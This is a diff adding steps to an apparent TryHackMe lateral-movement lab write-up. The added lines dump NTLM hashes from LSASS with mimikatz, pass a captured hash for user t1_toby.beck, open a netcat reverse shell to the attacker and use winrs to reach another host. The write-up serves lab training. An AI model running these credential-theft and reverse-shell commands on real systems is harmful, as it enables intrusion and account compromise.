@@ -233,18 +233,47 @@ To receive the reverse shell, run a listener on the attack machine:
 
 ## Get the flag
 
-The given credentials will grant administrative access to THMJMP2, allowing for the use of mimikatz to dump the 
+The given credentials will grant t2 administrative access to THMJMP2, allowing for the use of mimikatz to dump the 
 authentication material needed for any of the applied techniques. Both mimikatz and psexec64 are available at 
-`C:\tools` on THMJMP2.
+`C:\tools` on THMJMP2. Perform a Pass-the-Hash, Pass-the-Ticket or Pass-the-Key against domain user t1_toby.beck and 
+get the flag.
 
-Using an `ssh` session, use `mimikatz` to extract authentication material and perform Pass-the-Hash, Pass-the-Ticket 
-or Pass-the-Key against domain user t1_toby.beck.
+Using an `ssh` session:
 
-Once you have a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. 
+    ssh t2_felicia.dean@za.tryhackme.com@thmjmp2.za.tryhackme.com
+
+Start `mimikatz`:  
+
+    powershell
+    cd C:/tools
+
+    mimikatz.exe
+
+Elevate privileges:
+
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+
+Dump any cached NTLM hashes from the LSASS process memory:
+
+    mimikatz # sekurlsa::msv
+
+Using an ssh session mimics a reverse shell, but we can not use `/run:"cmd.exe"` because we can not spawn a sub-shell.
+
+`sekurlsa::pth` is going to inject t1_toby.beck's NTLM hash into the cmd.exe reverse shell back to Kali:
+
+    mimikatz # token::revert
+    sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe <vpn ip attack machine> 6666
+
+Start a listener on the attack machine:
+
+    sudo nc -lnvp 6666
+
+Having a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on THMIIS. 
 Since t1_toby.beck's credentials are already injected in your session as a result of the attacks, you can use `winrs` 
-without specifying any credentials, and it will use the ones available to your current session:
+without specifying any credentials, and it will use the ones available to the current session:
 
     winrs.exe -r:THMIIS.za.tryhackme.com cmd
 
-You'll find a flag on t1_toby.beck's desktop on THMIIS. 
+The flag is on t1_toby.beck's desktop on THMIIS. 
 
